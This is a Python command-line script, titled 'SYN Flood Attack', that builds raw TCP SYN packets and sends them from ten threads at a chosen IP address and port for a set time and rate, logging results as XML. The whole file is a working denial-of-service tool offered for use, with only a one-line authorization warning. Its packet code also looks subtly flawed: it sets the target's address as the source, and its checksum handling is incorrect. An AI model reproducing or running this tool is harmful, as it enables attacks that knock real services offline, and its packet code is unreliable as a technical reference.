#!/usr/bin/env python3
# SYN Flood Attack

import argparse
import socket
import random
import struct
import threading
import time
import os
import signal
import sys
from datetime import datetime

# Global flag to handle graceful termination
running = True

def dict_to_xml(tag, d):
    """Converts a dictionary to a simple XML string."""
    parts = [f"<{tag}>"]
    for key, value in d.items():
        if isinstance(value, dict):
            parts.append(dict_to_xml(key, value))
        else:
            parts.append(f"<{key}>{value}</{key}>")
    parts.append(f"</{tag}>")
    return ''.join(parts)

class SYNFlooder:
    def __init__(self, target_ip, target_port, duration, packet_rate):
        """Initialize the SYN flooder with the target configuration."""
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_duration = duration
        self.packet_rate = packet_rate
        self.threads = 10  # Number of threads for sending SYN packets
        self.running = False
        self.start_time = None
        self.log_dir = "/var/log/network_tests"
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(self.log_dir, f"syn_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
        self.stats = {
            'packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }

    def _log_event(self, event_type, message):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'message': message,
            'stats': self.stats.copy()
        }
        try:
            with open(self.log_file, 'a') as f:
                xml_entry = dict_to_xml('log', log_entry)
                f.write(xml_entry + '\n')
        except Exception as e:
            print(f"[LOG ERROR] {str(e)}")

    def create_syn_packet(self):
        """Creates a SYN packet for the attack."""
        # Random source port
        src_port = random.randint(1024, 65535)

        # Construct IP header
        ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 40, 0, 0, 64, 0x06, 0, socket.inet_aton(self.target_ip), socket.inet_aton(self.target_ip))
        
        # Construct TCP header
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset_res_flags = (5 << 4) + 0
        window = socket.htons(5840)  # maximum allowed window size
        checksum = 0
        urgent_pointer = 0
        tcp_header = struct.pack("!HHLLBBHHH", src_port, self.target_port, seq_num, ack_num, data_offset_res_flags, 0x02, window, checksum, urgent_pointer)

        # Calculate checksum (pseudo header + IP header + TCP header)
        checksum = self.calculate_checksum(ip_header + tcp_header)
        tcp_header = tcp_header[:16] + struct.pack("H", checksum) + tcp_header[18:]

        return ip_header + tcp_header

    def calculate_checksum(self, data):
        """Calculates checksum for the packet."""
        if len(data) % 2 != 0:
            data += b'\0'
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + (data[i + 1])
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF

    def send_syn_packets(self):
        """Sends SYN packets to the target."""
        end_time = time.time() + self.attack_duration
        while self.running and time.time() < end_time:
            try:
                packet = self.create_syn_packet()
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.sendto(packet, (self.target_ip, self.target_port))
                sock.close()

                self.stats['packets_sent'] += 1
                time.sleep(1 / self.packet_rate)
            except Exception as e:
                self.stats['errors'] += 1
                self._log_event('SYN_ERROR', str(e))
                time.sleep(0.001)

    def syn_flood(self):
        """Start the SYN flood attack using multiple threads."""
        self._log_event('SYN_START', 'Starting SYN flood attack')
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send_syn_packets)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def start(self):
        """Starts the attack."""
        self.running = True
        self.stats['start_time'] = datetime.now().isoformat()
        self.start_time = time.time()

        print(f"\n🔧 Attack Configuration:")
        print(f"   • Target IP: {self.target_ip}")
        print(f"   • Target Port: {self.target_port}")
        print(f"   • Duration: {self.attack_duration}s")
        print(f"   • Packet Rate: {self.packet_rate} pps per thread")
        print(f"   • Log File: {self.log_file}\n")

        try:
            self.syn_flood()
        except KeyboardInterrupt:
            print("\n🛑 Attack interrupted by user!")

        self.stop()

    def stop(self):
        """Stop the attack."""
        self.running = False
        self.stats['end_time'] = datetime.now().isoformat()
        self._log_event('TEST_END', 'SYN flood attack completed')

        duration = time.time() - self.start_time
        print("\n\n📊 Final Report:")
        print(f"   • Actual Duration: {duration:.1f}s")
        print(f"   • SYN Packets Sent: {self.stats['packets_sent']}")
        print(f"   • Errors: {self.stats['errors']}")
        print(f"   • Full Log: {self.log_file}\n")

def signal_handler(sig, frame):
    """Graceful exit handler."""
    global running
    print("\n🛑 Interrupt signal received!")
    running = False
    sys.exit(0)

def menu():
    """Interactive menu mode."""
    print("\n⚠️ LEGAL WARNING: Use this script only on your own networks or with explicit authorization!\n")
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port (e.g., 80): "))
    duration = int(input("Enter the attack duration in seconds: "))
    packet_rate = int(input("Enter the packet rate per second per thread: "))

    # Create and start the SYN flooder
    flooder = SYNFlooder(target_ip, target_port, duration, packet_rate)
    flooder.start()

def terminal():
    """Terminal mode using arguments."""
    parser = argparse.ArgumentParser(description="SYN Flood Attack Tool")
    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address.")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port.")
    parser.add_argument("-d", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
    parser.add_argument("-r", "--packet_rate", type=int, default=1000, help="Packets per second per thread (default: 1000).")

    args = parser.parse_args()

    flooder = SYNFlooder(args.target, args.port, args.duration, args.packet_rate)
    flooder.start()

def main():
    """Main function to handle both interactive and terminal modes."""
    signal.signal(signal.SIGINT, signal_handler)

    if len(sys.argv) > 1:
        terminal()  # Terminal mode
    else:
        menu()  # Interactive menu mode

if __name__ == "__main__":
    main()
